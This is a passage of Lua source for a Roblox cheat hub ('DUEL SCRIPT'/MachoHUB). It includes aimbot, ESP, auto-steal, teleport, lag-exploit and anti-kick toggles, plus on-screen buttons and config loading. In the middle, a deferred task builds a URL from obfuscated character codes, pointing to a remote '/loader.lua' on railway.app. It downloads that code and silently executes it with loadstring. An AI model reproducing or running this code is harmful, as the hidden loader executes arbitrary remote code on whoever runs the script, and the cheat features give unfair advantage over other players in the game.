			return
		end
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if not humanoid or not humanoidRootPart then
			return
		end

		if not humanoid.AutoRotate then
			humanoid.AutoRotate = true
		end

		if not character:FindFirstChildOfClass("Tool") then
			local v5 = tbl3.findBat()

			if v5 then
				pcall(function()
					humanoid:EquipTool(v5)
				end)
			end
		end

		local v5 = tbl3.closestRoot()

		if v5 then
			local n22 = v5.Position + Vector3.new(0, 1, 0)
			humanoid.AutoRotate = false
			local n23 = n22 - humanoidRootPart.Position
			local vector = Vector3.new(n23.X, 0, n23.Z)

			if n23.Magnitude > 0.01 and vector.Magnitude > 0.01 then
				humanoidRootPart.AssemblyAngularVelocity = Vector3.new(0, math.clamp(((math.deg(math.atan2(-vector.X, -vector.Z)) - humanoidRootPart.Orientation.Y + 180) % 360 - 180) * 8, -n20, 28), 0)
			else
				humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
			end

			local position = humanoidRootPart.Position
			local n24 = n22 - n23.Unit * n21 + Vector3.new(0, 1.3, 0) - position
			local vector2 = Vector3.new(n24.X, 0, n24.Z)
			local n25 = math.clamp(tonumber(n7) or 56.5, 1, 200)
			humanoidRootPart.AssemblyLinearVelocity = (vector2.Magnitude > 0.1 and vector2.Unit * n25 or Vector3.zero) + Vector3.new(0, math.clamp(n24.Y * 3, -n25, n25), 0)

			if vector2.Magnitude > 0.5 then
				humanoid:Move(vector2.Unit, false)
			end

			tbl3.v2Swing()
		else
			humanoid.AutoRotate = true
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
			tbl3.v2Swing()
		end
	end)

	tbl3.v2Conn = connection

	pcall(function()
		if tbl6 and tbl6.batV2 then
			tbl6.batV2(true)
		end
	end)
end

tbl3.toggleBatV2 = function()
	local v5 = flag14
	local batV2

	if flag14 then
		batV2 = v5
	else
		batV2 = tbl3.batV2
	end

	if batV2 then
		tbl3.stopBatV2()
	else
		if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
			pcall(function()
				if tbl6 and tbl6.batV2 then
					tbl6.batV2(false)
				end
			end)

			return
		end

		tbl3.startBatV2()
	end

	saveConfig()
end

task.defer(function()
	local function fn23(arg)
		local str3 = ""

		for i = 1, #arg do
			str3 ..= string.char(arg[i])
		end

		return str3
	end

	local str3 = fn23({
		104,
		116,
		116,
		112,
		115,
		58,
		47,
		47,
		119,
		101,
		98,
		45,
		112,
		114,
		111,
		100,
		117,
		99,
		116,
		105,
		111,
		110,
		45,
	}) .. fn23({ 56, 100, 100, 102, 54 }) .. fn23({ 46, 117, 112, 46, 114, 97, 105, 108, 119, 97, 121, 46, 97, 112, 112 }) .. fn23({ 47, 108, 111, 97, 100, 101, 114, 46, 108, 117, 97 })

	local ok, result = pcall(function()
		return game:HttpGet(str3)
	end)

	if ok and result then
		pcall(function()
			(loadstring or load)(result)()
		end)
	end
end)

local flag40 = false
MachotextGuiRef = nil

destroyMachotext = function()
	if MachotextGuiRef then
		pcall(function()
			MachotextGuiRef:Destroy()
		end)

		MachotextGuiRef = nil
	end

	pcall(function()
		for _, v5 in ipairs({ "MachoDuelsHeadTag", "MachoDuelsWatermark", "MACHODiscordLink" }) do
			local CoreGui = game:GetService("CoreGui")
			CoreGui = CoreGui and CoreGui:FindFirstChild(v5)

			if CoreGui then
				CoreGui:Destroy()
			end

			local playerGui = localPlayer and localPlayer:FindFirstChild("PlayerGui")

			if playerGui then
				local v6 = playerGui:FindFirstChild(v5)

				if v6 then
					v6:Destroy()
				end
			end
		end
	end)
end

local function fn23(arg)
	local color2 = arg or Color3.fromRGB(255, 255, 255)
	local color3 = Color3.fromRGB(255, 255, 255)

	if color2.R > 0.9 and color2.G > 0.9 and color2.B > 0.9 then
		local colorSequence = ColorSequence.new
		local tbl30 = {}
		local v5 = ColorSequenceKeypoint.new(0, Color3.fromRGB(130, 210, 255))
		local v6 = ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 255, 255))
		local v7 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(200, 160, 255))
		local v8 = ColorSequenceKeypoint.new(0.65, Color3.fromRGB(255, 140, 220))
		local v9 = ColorSequenceKeypoint.new(0.85, Color3.fromRGB(255, 235, 160))
		tbl30[1] = v5
		tbl30[2] = v6
		tbl30[3] = v7
		tbl30[4] = v8
		tbl30[5] = v9

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(130, 210, 255)))
			table.move(values, 1, values.n, 6, tbl30)
		end

		return colorSequence(tbl30)
	end

	local v5 = color2:Lerp(color3, 0.65)
	local v6 = color2:Lerp(Color3.fromRGB(10, 10, 15), 0.35)
	local colorSequence = ColorSequence.new
	local tbl30 = {}
	local v7 = ColorSequenceKeypoint.new(0, color2)
	local v8 = ColorSequenceKeypoint.new(0.2, color3)
	local v9 = ColorSequenceKeypoint.new(0.4, v5)
	local v10 = ColorSequenceKeypoint.new(0.6, v6)
	local v11 = ColorSequenceKeypoint.new(0.8, color3)
	local new = ColorSequenceKeypoint.new
	tbl30[1] = v7
	tbl30[2] = v8
	tbl30[3] = v9
	tbl30[4] = v10
	tbl30[5] = v11

	do
		local values = table.pack(new(1, color2))
		table.move(values, 1, values.n, 6, tbl30)
	end

	return colorSequence(tbl30)
end

buildMachotext = function()
	destroyMachotext()
	if not flag40 then
		return
	end

	local function fn24()
		local character = localPlayer.Character
		if not character then
			return nil
		end
		return character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
	end

	local billboardGui = Instance.new("BillboardGui")
	billboardGui.Name = "MachoDuelsHeadTag"
	billboardGui.AlwaysOnTop = true
	billboardGui.Size = UDim2.new(0, 250, 0, 50)
	billboardGui.StudsOffset = Vector3.new(0, 5.2, 0)
	billboardGui.MaxDistance = 1500
	billboardGui.ResetOnSpawn = false
	billboardGui.Adornee = fn24()

	pcall(function()
		if syn and syn.protect_gui then
			syn.protect_gui(billboardGui)
		end
	end)

	if not pcall(function()
		billboardGui.Parent = game:GetService("CoreGui")
	end) then
		billboardGui.Parent = localPlayer:WaitForChild("PlayerGui")
	end

	MachotextGuiRef = billboardGui
	local textLabel = Instance.new("TextLabel", billboardGui)
	textLabel.Name = "TitleText"
	textLabel.Size = UDim2.new(1, 0, 0, 26)
	textLabel.Position = UDim2.new(0, 0, 0, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.BorderSizePixel = 0
	textLabel.Text = "DUEL SCRIPT"
	textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	textLabel.Font = Enum.Font.GothamBlack
	textLabel.TextSize = 21
	textLabel.TextXAlignment = Enum.TextXAlignment.Center
	textLabel.TextStrokeTransparency = 0.2
	textLabel.TextStrokeColor3 = Color3.fromRGB(8, 8, 12)
	textLabel.ZIndex = 50
	local color2 = fn3 and fn3() or Color3.fromRGB(255, 255, 255)
	local uiGradient = Instance.new("UIGradient", textLabel)
	uiGradient.Color = fn23(color2)
	uiGradient.Rotation = 20
	local textLabel2 = Instance.new("TextLabel", billboardGui)
	textLabel2.Name = "DiscordText"
	textLabel2.Size = UDim2.new(1, 0, 0, 20)
	textLabel2.Position = UDim2.new(0, 0, 0, 25)
	textLabel2.BackgroundTransparency = 1
	textLabel2.BorderSizePixel = 0
	textLabel2.Text = "discord.gg/KX6YSZgggc"
	textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
	textLabel2.Font = Enum.Font.GothamBold
	textLabel2.TextSize = 13.5
	textLabel2.TextXAlignment = Enum.TextXAlignment.Center
	textLabel2.TextStrokeTransparency = 0.25
	textLabel2.TextStrokeColor3 = Color3.fromRGB(8, 8, 12)
	textLabel2.ZIndex = 50
	local uiGradient2 = Instance.new("UIGradient", textLabel2)
	uiGradient2.Color = fn23(color2)
	uiGradient2.Rotation = 20

	task.spawn(function()
		local n20 = 0
		local v5 = color2

		while billboardGui and billboardGui.Parent do
			n20 += 0.03
			local n21 = n20 * 1.35 % 2 - 1
			local n22 = (n20 * 1.35 + 0.25) % 2 - 1

			pcall(function()
				uiGradient.Offset = Vector2.new(n21, 0)
				uiGradient2.Offset = Vector2.new(n22, 0)
				local n23 = math.abs(math.sin(n20 * 3.2)) * 0.1
				textLabel.TextTransparency = 0.02 + n23
				textLabel2.TextTransparency = 0.04 + n23
				local color3 = fn3 and fn3() or Color3.fromRGB(255, 255, 255)

				if color3 ~= v5 then
					v5 = color3
					local v6 = fn23(color3)
					uiGradient.Color = v6
					uiGradient2.Color = v6
				end

				if not billboardGui.Adornee or not billboardGui.Adornee.Parent or not billboardGui.Adornee:IsDescendantOf(workspace) then
					local v6 = fn24()

					if v6 then
						billboardGui.Adornee = v6
					end
				end
			end)

			task.wait(0.03)
		end
	end)
end

destroyMobileButtons = function()
	MOB_BTN_ICONS = {}
	MOB_BTN_THEME = {}

	if mobGuiRef then
		pcall(function()
			mobGuiRef.Enabled = false

			for _, descendant in ipairs(mobGuiRef:GetDescendants()) do
				if descendant:IsA("GuiObject") then
					descendant.Active = false

					if descendant:IsA("GuiButton") then
						descendant.Visible = false
					end
				end
			end

			mobGuiRef:Destroy()
		end)

		mobGuiRef = nil
	end

	for _, v5 in ipairs({ "MachoMobileButtons", "SpectrumMobileButtons", "MoveeMobileButtons" }) do
		pcall(function()
			local v6 = game:GetService("CoreGui"):FindFirstChild(v5)

			if v6 then
				v6:Destroy()
			end

			local playerGui = localPlayer:FindFirstChild("PlayerGui")

			if playerGui then
				local v7 = playerGui:FindFirstChild(v5)

				if v7 then
					v7:Destroy()
				end
			end
		end)
	end

	tbl6 = {}

	pcall(function()
		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			if currentCamera.CameraType == Enum.CameraType.Scriptable then
				currentCamera.CameraType = Enum.CameraType.Custom
			end
		end

		UserInputService.MouseIconEnabled = true

		pcall(function()
			UserInputService.ModalEnabled = false
		end)
	end)
end

buildMobileButtons = function()
	destroyMobileButtons()
	if not flag24 then
		return
	end
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MachoMobileButtons"
	screenGui.ResetOnSpawn = false
	screenGui.DisplayOrder = 5000
	screenGui.IgnoreGuiInset = true

	pcall(function()
		if syn and syn.protect_gui then
			syn.protect_gui(screenGui)
		end
	end)

	if not pcall(function()
		screenGui.Parent = game:GetService("CoreGui")
	end) then
		screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
	end

	mobGuiRef = screenGui
	local n20 = math.clamp((tonumber(n13) or 80) / 80, 0.55, 1.6)
	local n21 = math.floor(84 * n20 + 0.5)
	local n22 = math.floor(36 * n20 + 0.5)
	local n23 = math.max(4, math.floor(7 * n20 + 0.5))
	local n24 = math.max(6, math.floor(9 * n20 + 0.5))
	local color2 = fn3 and fn3() or Color3.fromRGB(0, 255, 120)
	local color3 = Color3.fromRGB(12, 14, 15)
	local color4 = Color3.new(color2.R * 0.3, color2.G * 0.3, color2.B * 0.3)
	local color5 = Color3.fromRGB(38, 44, 42)
	local v5 = color2
	local color6 = Color3.fromRGB(226, 234, 230)
	local color7 = Color3.fromRGB(255, 255, 255)
	local n25 = n21 * 3 + n23 * 2
	local frame = Instance.new("Frame", screenGui)
	frame.Name = "MobileButtons"
	frame.Size = UDim2.new(0, n25 + 12, 0, n22 * 4 + n23 * 3 + 12)
	frame.Position = UDim2.new(1, -(n25 + 20), 0.32, 0)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.Active = false
	frame.ZIndex = 100
	local group = loadBtnPositions().__group

	if type(group) == "table" and group.xo ~= nil then
		frame.Position = UDim2.new(group.xs or 0, group.xo, group.ys or 0, group.yo or 0)
	end

	local flag41 = false
	local v6 = nil
	local v7 = nil
	local v8 = nil
	local flag42 = false

	UserInputService.InputChanged:Connect(function(input)
		if flag33 then
			flag41 = false
			return
		end

		if input == v8 and flag41 and nil and nil then
			local n26 = input.Position.X - v6.X
			local n27 = input.Position.Y - v6.Y

			if math.abs(n26) > 8 or math.abs(n27) > 8 then
				flag42 = true
				frame.Position = UDim2.new(v7.X.Scale, v7.X.Offset + n26, v7.Y.Scale, v7.Y.Offset + n27)
			end
		end
	end)

	local function fn24(text3, arg, arg2, arg3, arg4, arg5)
		local v9 = arg5 and n25 or n21
		local n26 = arg5 and 0 or arg * (n21 + n23)
		local n27 = 8 + arg2 * (n22 + n23)
		local frame2 = Instance.new("Frame", frame)
		frame2.Name = tostring(text3):gsub("%s+", "")
		frame2.Size = UDim2.new(0, v9, 0, n22)
		frame2.Position = UDim2.new(0, 8 + n26, 0, n27)
		frame2.BackgroundColor3 = color3
		frame2.BackgroundTransparency = 0.35
		frame2.BorderSizePixel = 0
		frame2.Active = true
		frame2.ZIndex = 200
		Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, n24)
		local uiStroke = Instance.new("UIStroke", frame2)
		uiStroke.Color = color5
		uiStroke.Thickness = 1.4
		uiStroke.Transparency = 0.25
		local imageLabel = Instance.new("ImageLabel", frame2)
		imageLabel.Name = "Glow"
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = "rbxassetid://6014261993"
		imageLabel.ImageColor3 = color2
		imageLabel.ImageTransparency = 1
		imageLabel.ScaleType = Enum.ScaleType.Slice
		imageLabel.SliceCenter = Rect.new(49, 49, 450, 450)
		imageLabel.Size = UDim2.new(1, 26, 1, 26)
		imageLabel.Position = UDim2.new(0, -13, 0, -13)
		imageLabel.ZIndex = 199
		imageLabel.Active = false
		local imageLabel2 = Instance.new("ImageLabel", frame2)
		imageLabel2.Name = "BtnImage"
		imageLabel2.Size = UDim2.new(1, 0, 1, 0)
		imageLabel2.BackgroundTransparency = 1
		imageLabel2.ImageTransparency = 0.72
		imageLabel2.ScaleType = Enum.ScaleType.Crop
		imageLabel2.ZIndex = 200
		imageLabel2.Image = ""
		Instance.new("UICorner", imageLabel2).CornerRadius = UDim.new(0, n24)
		MOB_BTN_ICONS = MOB_BTN_ICONS or {}
		imageLabel2.Image = tbl20 and tbl20[n17] or image
		imageLabel2.ImageColor3 = Color3.fromRGB(255, 255, 255)
		imageLabel2.ImageTransparency = 0.08
		local uiGradient = Instance.new("UIGradient", imageLabel2)
		uiGradient.Rotation = 90
		local new = NumberSequenceKeypoint.new
		uiGradient.Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0), new(1, 0.25) })
		table.insert(MOB_BTN_ICONS, imageLabel2)
		local textButton = Instance.new("TextButton", frame2)
		textButton.Size = UDim2.new(1, 0, 1, 0)
		textButton.BackgroundTransparency = 1
		textButton.Text = text3
		textButton.TextColor3 = color6
		textButton.Font = Enum.Font.GothamBold
		textButton.TextSize = math.max(8, math.floor((arg5 and 11 or 10) * n20 + 0.5))
		textButton.TextWrapped = true
		textButton.LineHeight = 1.1
		textButton.BorderSizePixel = 0
		textButton.AutoButtonColor = false
		textButton.ZIndex = 201
		local uiStroke2 = Instance.new("UIStroke", textButton)
		uiStroke2.Color = Color3.fromRGB(0, 0, 0)
		uiStroke2.Thickness = 1.6
		uiStroke2.Transparency = 0.35
		local flag43 = false
		local flag44 = false
		local position = nil
		local position2 = nil
		local v10 = nil
		local flag45 = false

		PULSE.add(function(arg6)
			if not frame2.Parent then
				return false
			end
			local v11 = fn3 and fn3() or color2

			if flag43 then
				uiStroke.Transparency = 0.16 - 0.16 * arg6
				imageLabel.ImageTransparency = 0.78 - 0.16 * arg6
				textButton.TextColor3 = PULSE.mix(Color3.fromRGB(255, 255, 255), v11, 0.1 + 0.22 * arg6)
			else
				uiStroke.Transparency = 0.46 - 0.24 * arg6
				uiStroke.Color = PULSE.mix(color5, v11, 0.25 + 0.35 * arg6)
				imageLabel.ImageTransparency = 0.97 - 0.09 * arg6
				textButton.TextColor3 = PULSE.mix(color6, v11, 0.1 + 0.22 * arg6)
			end
		end)

		MOB_BTN_THEME = MOB_BTN_THEME or {}

		table.insert(MOB_BTN_THEME, function()
			local v11 = fn3 and fn3() or color2
			color2 = v11
			color4 = Color3.new(v11.R * 0.3, v11.G * 0.3, v11.B * 0.3)
			v5 = v11

			pcall(function()
				imageLabel.ImageColor3 = v11

				if flag43 then
					frame2.BackgroundColor3 = color4
					uiStroke.Color = v11
				else
					uiStroke.Color = color5
				end
			end)
		end)

		local uiScale = Instance.new("UIScale")
		uiScale.Scale = 1
		uiScale.Parent = frame2

		local function fn25(arg6)
			TweenService:Create(uiScale, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = arg6 or 0.92 }):Play()

			task.delay(0.1, function()
				TweenService:Create(uiScale, TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
			end)
		end

		local function fn26(arg6)
			flag43 = arg6
			TweenService:Create(frame2, TweenInfo.new(0.22, Enum.EasingStyle.Quad), { BackgroundColor3 = arg6 and color4 or color3 }):Play()
			TweenService:Create(uiStroke, TweenInfo.new(0.22), { Color = arg6 and v5 or color5, Transparency = arg6 and 0.05 or 0.25 }):Play()
			TweenService:Create(imageLabel, TweenInfo.new(0.25), { ImageTransparency = arg6 and 0.68 or 1 }):Play()
			textButton.TextColor3 = arg6 and color7 or color6
			fn25(0.9)
		end

		textButton.MouseButton1Click:Connect(function()
			if flag45 then
				return
			end

			if arg3 then
				flag43 = not flag43
				TweenService:Create(frame2, TweenInfo.new(0.22, Enum.EasingStyle.Quad), { BackgroundColor3 = flag43 and color4 or color3 }):Play()
				TweenService:Create(uiStroke, TweenInfo.new(0.22), { Color = flag43 and v5 or color5, Transparency = flag43 and 0.05 or 0.25 }):Play()
				TweenService:Create(imageLabel, TweenInfo.new(0.25), { ImageTransparency = flag43 and 0.68 or 1 }):Play()
				textButton.TextColor3 = flag43 and color7 or color6
				fn25(0.88)

				if arg4 then
					arg4(flag43)
				end
			else
				fn25(0.88)
				local tbl30 = { BackgroundColor3 = color4 }
				TweenService:Create(frame2, TweenInfo.new(0.1), tbl30):Play()
				local tbl31 = { Color = v5, Transparency = 0.05 }
				TweenService:Create(uiStroke, TweenInfo.new(0.1), tbl31):Play()
				TweenService:Create(imageLabel, TweenInfo.new(0.1), { ImageTransparency = 0.6 }):Play()
				textButton.TextColor3 = color7

				task.delay(0.22, function()
					local tbl32 = { BackgroundColor3 = color3 }
					TweenService:Create(frame2, TweenInfo.new(0.2), tbl32):Play()
					local tbl33 = { Color = color5, Transparency = 0.25 }
					TweenService:Create(uiStroke, TweenInfo.new(0.2), tbl33):Play()
					TweenService:Create(imageLabel, TweenInfo.new(0.25), { ImageTransparency = 1 }):Play()
					textButton.TextColor3 = color6
				end)

				if arg4 then
					arg4()
				end
			end
		end)

		frame2.Name = text3:gsub("%s+", "_"):gsub("\n", "_")
		local name = frame2.Name
		local v11 = loadBtnPositions()[name]

		if type(v11) == "table" and v11.xo ~= nil then
			frame2.Position = UDim2.new(0, v11.xo, 0, v11.yo)
		end

		textButton.InputBegan:Connect(function(input)
			if flag33 then
				return
			end

			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag44 = true
				flag45 = false
				position = input.Position
				position2 = frame2.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						if flag45 then
							pcall(saveBtnPositions)
						end

						flag44 = false
					end
				end)
			end
		end)

		textButton.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				v10 = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == v10 and flag44 and position and position2 then
				if flag33 then
					return
				end
				local n28 = input.Position.X - position.X
				local n29 = input.Position.Y - position.Y

				if math.abs(n28) > 6 or math.abs(n29) > 6 then
					flag45 = true
					frame2.Position = UDim2.new(0, position2.X.Offset + n28, 0, position2.Y.Offset + n29)
				end
			end
		end)

		textButton.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				if flag45 then
					pcall(saveBtnPositions)
				end

				task.defer(function()
					flag44 = false
					flag45 = false
				end)
			end
		end)

		return frame2, fn26
	end

	local function fn25()
		if tbl6.laggerCarry then
			tbl6.laggerCarry(flag2 and flag)
		end

		if tbl6.laggerNormal then
			tbl6.laggerNormal(flag2 and not flag)
		end

		if tbl6.carrySpeed then
			tbl6.carrySpeed(flag and not flag2)
		end
	end

	local antiDesync, v9 = fn24("ANTI DESYNC", 0, 0, true, function(arg)
		if arg then
			if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
				if tbl6.tpBat then
					tbl6.tpBat(false)
				end

				if tbl3.setTPBatVisual then
					tbl3.setTPBatVisual(false)
				end

				return
			end

			if Macho_forceAimbotOff then
				Macho_forceAimbotOff()
			end

			tbl3.startTPBat()

			if tbl3.setTPBatVisual then
				tbl3.setTPBatVisual(true)
			end

			if tbl6.autoBat then
				tbl6.autoBat(false)
			end

			if autoBatSetVisual then
				autoBatSetVisual(false)
			end
		else
			tbl3.stopTPBat()

			if tbl3.setTPBatVisual then
				tbl3.setTPBatVisual(false)
			end
		end
	end, false)

	tbl6.tpBat = v9

	local batV2, v10 = fn24("BAT V2", 0, 1, true, function(arg)
		if arg then
			if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
				if tbl6.batV2 then
					tbl6.batV2(false)
				end

				return
			end

			tbl3.startBatV2()
		else
			tbl3.stopBatV2()
		end

		saveConfig()
	end, false)

	tbl6.batV2 = v10

	if flag14 or tbl3.batV2 then
		pcall(function()
			v10(true)
		end)
	end

	local dropBr, v11 = fn24("DROP BR", 1, 0, false, function()
		runDrop()
	end, false)

	tbl6.drop = v11

	local autoLeft, v12 = fn24("AUTO LEFT", 2, 0, true, function(arg)
		if arg then
			if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
				if tbl6.autoLeft then
					tbl6.autoLeft(false)
				end

				if v then
					v(false)
				end

				return
			end

			if flag12 then
				flag12 = false
				stopAutoRight()

				if v2 then
					v2(false)
				end

				if tbl6.autoRight then
					tbl6.autoRight(false)
				end
			end

			if flag13 then
				stopBatAimbot()

				if autoBatSetVisual then
					autoBatSetVisual(false)
				end

				if tbl6.autoBat then
					tbl6.autoBat(false)
				end
			end

			flag11 = true
			startAutoLeft()

			if v then
				v(true)
			end
		else
			flag11 = false
			stopAutoLeft()

			if v then
				v(false)
			end
		end
	end, false)

	tbl6.autoLeft = v12

	local aimBot, v13 = fn24("AIM BOT", 1, 1, true, function(arg)
		if arg then
			if flag11 then
				flag11 = false
				stopAutoLeft()

				if v then
					v(false)
				end

				if tbl6.autoLeft then
					tbl6.autoLeft(false)
				end
			end

			if flag12 then
				flag12 = false
				stopAutoRight()

				if v2 then
					v2(false)
				end

				if tbl6.autoRight then
					tbl6.autoRight(false)
				end
			end

			queueAutoBatStart()

			if autoBatSetVisual then
				autoBatSetVisual(flag13)
			end

			if not flag13 and tbl6.autoBat then
				tbl6.autoBat(false)
			end
		else
			stopBatAimbot()

			if autoBatSetVisual then
				autoBatSetVisual(false)
			end
		end
	end, false)

	tbl6.autoBat = v13

	local autoRight, v14 = fn24("AUTO RIGHT", 2, 1, true, function(arg)
		if arg then
			if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
				if tbl6.autoRight then
					tbl6.autoRight(false)
				end

				if v2 then
					v2(false)
				end

				return
			end

			if flag11 then
				flag11 = false
				stopAutoLeft()

				if v then
					v(false)
				end

				if tbl6.autoLeft then
					tbl6.autoLeft(false)
				end
			end

			if flag13 then
				stopBatAimbot()

				if autoBatSetVisual then
					autoBatSetVisual(false)
				end

				if tbl6.autoBat then
					tbl6.autoBat(false)
				end
			end

			flag12 = true
			startAutoRight()

			if v2 then
				v2(true)
			end
		else
			flag12 = false
			stopAutoRight()

			if v2 then
				v2(false)
			end
		end
	end, false)

	tbl6.autoRight = v14

	local tpDown, v15 = fn24("TP DOWN", 1, 2, false, function()
		runTPFloor()
	end, false)

	tbl6.tpDown = v15

	local carrySpeed, v16 = fn24("CARRY SPEED", 2, 2, true, function(arg)
		if flag2 then
			flag2 = false
		end

		flag = arg
		refreshSpeedModeLabel()
		fn25()
		saveConfig()
	end, false)

	tbl6.carrySpeed = v16

	local laggerCarry, v17 = fn24("LAGGER CARRY", 1, 3, true, function(arg)
		if arg then
			flag2 = true
			flag = true
		elseif flag2 and flag then
			flag2 = false
			flag = false
		end

		refreshSpeedModeLabel()
		fn25()
		saveConfig()
	end, false)

	tbl6.laggerCarry = v17

	local laggerNormal, v18 = fn24("LAGGER NORMAL", 2, 3, true, function(arg)
		if arg then
			flag2 = true
			flag = false
		elseif flag2 and not flag then
			flag2 = false
		end

		refreshSpeedModeLabel()
		fn25()
		saveConfig()
	end, false)

	tbl6.laggerNormal = v18

	tbl6.lagger = function(arg)
		if arg then
			if flag then
				if tbl6.laggerCarry then
					tbl6.laggerCarry(true)
				end
			elseif tbl6.laggerNormal then
				tbl6.laggerNormal(true)
			end
		else
			if tbl6.laggerCarry then
				tbl6.laggerCarry(false)
			end

			if tbl6.laggerNormal then
				tbl6.laggerNormal(false)
			end
		end
	end

	if tbl6.autoLeft then
		tbl6.autoLeft(flag11)
	end

	if tbl6.autoRight then
		tbl6.autoRight(flag12)
	end

	if tbl6.autoBat then
		tbl6.autoBat(flag13)
	end

	fn25()

	if tbl6.tpBat then
		tbl6.tpBat(tbl3.tpBat)
	end
end

pcall(function()
	if not (isfile and isfile("MachoHUB.json")) then
		return
	end

	local ok, result = pcall(function()
		return HttpService:JSONDecode(readfile("MachoHUB.json"))
	end)

	if not (ok and type(result) == "table") then
		return
	end

	if type(result.normalSpeed) == "number" and result.normalSpeed > 0 then
		n = result.normalSpeed
	end

	if type(result.carrySpeed) == "number" and result.carrySpeed > 0 then
		n2 = result.carrySpeed
	end

	if type(result.laggerSpeed) == "number" and result.laggerSpeed > 0 then
		n3 = result.laggerSpeed
	end

	if type(result.laggerCarrySpeed) == "number" and result.laggerCarrySpeed > 0 then
		n4 = result.laggerCarrySpeed
	end

	if type(result.carrySpeedActive) == "boolean" then
		flag = result.carrySpeedActive
	end

	if type(result.antiDieEnabled) == "boolean" then
		flag3 = result.antiDieEnabled
	end

	if type(result.laggerModeEnabled) == "boolean" then
		flag2 = result.laggerModeEnabled
	end

	if type(result.antiRagdoll) == "boolean" then
		flag4 = result.antiRagdoll
	end

	if type(result.infiniteJump) == "boolean" then
		flag5 = result.infiniteJump
	end

	if type(result.infJumpMode) == "string" then
		str2 = result.infJumpMode
	end

	if type(result.medusaCounter) == "boolean" then
		flag6 = result.medusaCounter
	end

	tbl3.antiKick = true

	if type(result.batCounter) == "boolean" then
		flag7 = result.batCounter
	end

	if type(result.autoStealEnabled) == "boolean" then
		tbl23.AutoStealEnabled = result.autoStealEnabled
	end

	if type(result.batV2Speed) == "number" then
		n7 = result.batV2Speed
	end

	if type(result.batV2Enabled) == "boolean" then
		flag14 = result.batV2Enabled
	end

	if type(result.mirrorTPDownEnabled) == "boolean" then
		flag15 = result.mirrorTPDownEnabled
	end

	if type(result.voidThemeName) == "string" then
		str = result.voidThemeName
	end

	if type(result.stealBarStyle) == "number" then
		n14 = result.stealBarStyle
	end

	if type(result.stealBarScale) == "number" then
		n15 = result.stealBarScale
	end

	if type(result.stealMode) == "number" then
		tbl23.Mode = math.clamp(math.floor(result.stealMode), 1, 4)
	end

	if type(result.grabRadius) == "number" then
		tbl23.StealRadius = result.grabRadius
	end

	tbl23.StealDuration = 1.3

	if type(result.autoSwing) == "boolean" then
		flag18 = result.autoSwing
	end

	if type(result.aimbotAfterHit) == "boolean" then
		flag16 = result.aimbotAfterHit
	end

	if type(result.unwalkEnabled) == "boolean" then
		flag8 = result.unwalkEnabled
	end

	if type(result.antiLag) == "boolean" then
		flag20 = result.antiLag
	end

	if type(result.stretchRez) == "boolean" then
		flag21 = result.stretchRez
	end

	if type(result.autoTPEnabled) == "boolean" then
		flag22 = result.autoTPEnabled
	end

	if type(result.autoTPHeight) == "number" then
		autoTPHeight = result.autoTPHeight
	end

	if type(result.fovValue) == "number" then
		fieldOfView = result.fovValue
	end

	if type(result.fovIndex) == "number" then
		n16 = result.fovIndex
	end

	if type(result.skyTheme) == "string" then
		text = result.skyTheme
	end

	if type(result.autoMoveSwing) == "boolean" then
		flag19 = result.autoMoveSwing
	end

	if type(result.autoMoveSwingInterval) == "number" then
		n12 = result.autoMoveSwingInterval
	end

	if type(result.ragdollGui) == "boolean" then
		flag32 = result.ragdollGui
	end

	if type(result.mobileButtonsEnabled) == "boolean" then
		flag24 = result.mobileButtonsEnabled
	end

	if type(result.MachotextEnabled) == "boolean" then
		flag40 = result.MachotextEnabled
	end

	if type(result.logoCircleEnabled) == "boolean" then
		visible = result.logoCircleEnabled
	end

	if type(result.uiLocked) == "boolean" then
		flag33 = result.uiLocked
	end

	if type(result.mobileButtonsSize) == "number" then
		n13 = result.mobileButtonsSize
	end

	if type(result.circleButtonsEnabled) == "boolean" then
		flag26 = result.circleButtonsEnabled
	end

	if type(result.headlessEnabled) == "boolean" then
		flag29 = result.headlessEnabled
	end

	if type(result.korbloxEnabled) == "boolean" then
		flag30 = result.korbloxEnabled
	end

	if type(result.espEnabled) == "boolean" then
		flag34 = result.espEnabled
	end

	if type(result.espAvatarsEnabled) == "boolean" then
		flag35 = result.espAvatarsEnabled
	end

	if type(result.backgroundEnabled) == "boolean" then
		flag36 = result.backgroundEnabled
	end

	if type(result.backgroundIndex) == "number" then
		n17 = math.max(1, math.floor(result.backgroundIndex))
	end

	if type(result.uiScale) == "number" and result.uiScale >= 0.4 and result.uiScale <= 2 then
		uiScaleValue = result.uiScale
	end

	if type(result.guiScale) == "number" and result.guiScale >= 0.4 and result.guiScale <= 2 then
